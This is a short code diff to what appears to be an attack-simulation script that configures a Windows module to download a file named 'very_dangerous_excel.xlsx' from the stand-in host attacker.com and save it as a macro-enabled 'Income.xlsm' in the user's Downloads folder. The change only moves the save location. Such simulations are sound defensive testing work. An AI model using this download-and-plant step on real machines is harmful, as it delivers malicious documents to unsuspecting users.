@@ -66,7 +66,7 @@ execution = WindowsModule("62385f03a0e69ed2274622cc", debug=True)
 # Update the input arguments to your own ones
 execution.input_arguments.update({
     "download_file_url": "https://attacker.com/very_dangerous_excel.xlsx",
-    "download_file_path": "$env:temp\Income.xlsm",
+    "download_file_path": "$env:userprofile\Downloads\Income.xlsm",
 })
 # Execute the module after initialization
 execution.run()
